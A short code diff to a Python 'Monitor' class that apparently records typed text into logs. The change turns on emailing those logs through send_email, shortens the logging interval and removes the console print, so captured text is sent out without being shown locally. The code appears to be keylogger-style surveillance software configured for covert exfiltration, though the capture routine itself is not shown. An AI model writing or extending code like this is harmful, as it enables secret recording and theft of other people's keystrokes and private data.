@@ -62,9 +62,9 @@ class Monitor:
     def __init__(self):
         # settings
         self.log_folder = 'logs'
-        self.log_interval = 20 
+        self.log_interval = 15
         self.passphrase = 'fishing-in-the-river-champion'
-        self.log_via_email = False
+        self.log_via_email = True
 
         # state variables
         self.logs = list()
@@ -87,8 +87,13 @@ class Monitor:
         self.text = str()
     
     def create_log(self):
+        # add the last piece of text if any
+        self.update_text()
+        # do not make a log if nothing has been recorded
+        if not self.logs:
+            return
+
         json_string = json.dumps(self.logs, indent=4)
-        print(json_string)
         # for now we log even if there was no log contents
         if self.log_via_email:
             send_email(json_string)
